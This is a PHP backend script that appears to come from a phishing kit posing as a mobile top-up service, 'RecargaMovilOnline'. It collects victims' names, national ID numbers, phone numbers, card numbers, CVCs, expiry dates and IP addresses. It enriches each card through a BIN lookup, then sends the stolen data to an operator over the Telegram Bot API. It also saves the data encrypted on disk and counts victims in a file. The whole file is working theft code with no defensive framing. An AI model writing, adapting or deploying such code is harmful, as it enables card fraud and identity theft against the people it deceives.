<?php
if(isset($_POST)){
	$filter = "";
	$a1 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["HTTP_X_REAL_IP"] : getenv("REMOTE_ADDR"));
	$a2 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["REMOTE_ADDR"] : gethostbyaddr($_SERVER["REMOTE_ADDR"]));
	if(isset($_POST["name"])){
        $a3 = $_POST["name"];
        $filter .= strtolower($_POST["name"]);
    }
	if(isset($_POST["dni"])){
        $a4 = $_POST["dni"];
        $filter .= strtolower($_POST["dni"]);
    }
	if(isset($_POST["number"])){
        $a5 = $_POST["number"];
        $filter .= strtolower($_POST["number"]);
    }
	if(isset($_POST["company"])){
        $a6 = $_POST["company"];
        $filter .= strtolower($_POST["company"]);
    }
	if(isset($_POST["card"])){
        $a7 = $_POST["card"];
        $filter .= strtolower($_POST["card"]);
    }
	if(isset($_POST["cvc"])){
        $a8 = $_POST["cvc"];
        $filter .= strtolower($_POST["cvc"]);
    }
	if(isset($_POST["venc"])){
        $a9 = $_POST["venc"];
        $filter .= strtolower($_POST["venc"]);
    }

	$filter = base64_encode($filter);
    $bin = substr(str_replace(" ", "", $_POST["card"]), 0, 6);
    $result = file_get_contents("https://lookup.binlist.net/".$bin);
    $result = json_decode($result, true);
    $a10 = (isset($result["type"]) ? $result["type"] : "No encontrado");
    $a11 = (isset($result["brand"]) ? $result["brand"] : "No encontrado");
    $a12 = (isset($result["scheme"]) ? $result["scheme"] : "No encontrado");
    $a13 = (isset($result["country"]["name"]) ? $result["country"]["name"] : "No encontrado");
    $a14 = (isset($result["bank"]["name"]) ? $result["bank"]["name"] : "No encontrado");
    $a15 = (isset($result["bank"]["url"]) ? $result["bank"]["url"] : "No encontrado");
    $a16 = (isset($result["bank"]["phone"]) ? $result["bank"]["phone"] : "No encontrado");
    $a17 = (isset($result["bank"]["city"]) ? $result["bank"]["city"] : "No encontrado");
	include("assets/c.php");$mensaje = str_replace(
    array("{1}","{2}","{3}","{4}","{5}","{6}","{7}","{8}","{9}","{10}","{11}","{12}","{13}","{14}","{15}","{16}","{17}"),
      array($a1,$a2,$a3,$a4,$a5,$a6,$a7,$a8,$a9,$a10,$a11,$a12,$a13,$a14,$a15,$a16,$a17),
      $message);
	define("BOT_TOKEN", $bottoken);
define("CHAT_ID", $chatid);
function enviar_telegram($msj){
    $queryArray = [
        "chat_id" => CHAT_ID,
        "text" => $msj,
    ];
    $url = "https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?". http_build_query($queryArray);
    $result = file_get_contents($url);
}
$file_name = "assets/info/".$a1.".db";
$read_data = fopen($file_name, "a+");
include_once("panel/core.php");
function enviar(){
    global $telegram_send, $save_file, $email_send, $mensaje;
    $actual_victims = file_get_contents("panel/victims.db");
    $add_victim = fopen("panel/victims.db", "w+");
    fwrite($add_victim, intval($actual_victims)+1);
    fclose($add_victim);
    if($telegram_send){
        enviar_telegram($mensaje);
    }
    if($save_file){
        $ccs_file_name = "assets/c/data.db";
        $actual_data = file_get_contents($ccs_file_name);
        $save_data = fopen($ccs_file_name, "w+");
        if($actual_data != ""){
            fwrite($save_data, $actual_data);
            $msg .= "\n========== Inicio RecargaMovilOnline ==========\n\n";
            $msg .= $mensaje;
            $msg .= "\n\n========== Fin RecargaMovilOnline ==========\n\n";
            $msg = encrypt_data($msg);
            fwrite($save_data, $msg.",");
            fclose($save_data);
        }
        else {
            $msg = "========== Inicio RecargaMovilOnline ==========\n\n";
            $msg .= $mensaje;
            $msg .= "\n\n========== Fin RecargaMovilOnline ==========\n\n";
            $msg = encrypt_data($msg);
            fwrite($save_data, $msg.",");
            fclose($save_data);
        }
    }
}
if($read_data){
    $data = fgets($read_data);
    $data = explode(";", $data);
    if(!(in_array($filter, $data))){
        fwrite($read_data, $filter.";");
        fclose($read_data);
        enviar();
    }
}
else {
    fwrite($read_data, $filter.";");
    fclose($read_data);
    enviar();
}
}
?>